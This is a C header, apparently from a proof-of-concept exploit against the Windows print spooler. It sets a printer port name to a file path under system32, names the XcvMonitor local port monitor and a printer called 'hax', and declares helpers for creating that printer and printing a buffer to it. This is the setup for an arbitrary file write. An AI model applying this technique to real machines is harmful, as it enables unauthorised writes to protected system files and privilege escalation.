#pragma once

#define err(m) (printf("[-] %s : 0x%08X\n", m, GetLastError()))

#define PORT_NAME    L"c:\\windows\\system32\\secret.txt"
#define DRIVER_NAME  L"Generic / Text Only"
#define MONITOR_NAME L",XcvMonitor Local Port"
#define PRINTER_NAME L"hax"

void DisplayPortMonitorsW(void);
BOOL XcvCommandW(HANDLE hMonitor, LPCWSTR Cmd, LPCWSTR Data);
HRESULT InstallPrinterDriverW(LPCWSTR DriverName);
HANDLE CreatePrinterW(LPCWSTR PortName, LPCWSTR DriverName, LPCWSTR PrinterName);
void PrintBuffer(HANDLE hPrinter, PBYTE Buf, DWORD cbLength);